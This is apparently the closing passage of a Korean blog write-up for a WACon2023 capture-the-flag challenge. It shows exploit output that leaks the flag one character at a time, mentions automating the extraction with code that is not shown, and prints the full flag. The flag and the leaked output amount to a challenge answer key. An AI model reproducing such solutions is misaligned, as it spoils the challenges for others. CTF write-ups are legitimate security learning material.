'////////////////////////////////////////$flag[48] = d', '////////////////////////////////////////$flag[49] = 7', '////////////////////////////////////////$flag[50] = e', '////////////////////////////////////////$flag[51] = 6', '////////////////////////////////////////$flag[52] = d', '////////////////////////////////////////$flag[53] = d', '////////////////////////////////////////$flag[54] = d', '////////////////////////////////////////$flag[55] = 8', '////////////////////////////////////////$flag[56] = a', '////////////////////////////////////////$flag[57] = 9', '////////////////////////////////////////$flag[58] = 2', '////////////////////////////////////////$flag[59] = b', '////////////////////////////////////////$flag[60] = 8', '////////////////////////////////////////$flag[61] = 4', '////////////////////////////////////////$flag[62] = d', '////////////////////////////////////////$flag[63] = 5', '////////////////////////////////////////$flag[64] = 4', '////////////////////////////////////////$flag[65] = d', '////////////////////////////////////////$flag[66] = 4', '////////////////////////////////////////$flag[67] = 1', '////////////////////////////////////////$flag[68] = 7', '////////////////////////////////////////$flag[69] = 2', '////////////////////////////////////////$flag[70] = 9', '////////////////////////////////////////$flag[71] = d', '////////////////////////////////////////$flag[72] = 5', '////////////////////////////////////////$flag[73] = e']
```

한문자씩 나타나 있음으로 이를 일일히 가져오는 것보다 자동화하는 코드를 작성해 FLAG를 최종적으로 가져옵니다.

![Alt text](https://blog.kakaocdn.net/dn/dfTJzp/btsv8ivOaCz/RjT02hxJ3hY0WXBA6vpWCk/img.png)

위와 같이 성공적으로 FLAG를 얻어올 수 있습니다.

#### FLAG : ``WACon2023{b6ee5fc687a677bb1baf7285dca31b675f68c9d7e6ddd8a92b84d54d41729d5e}``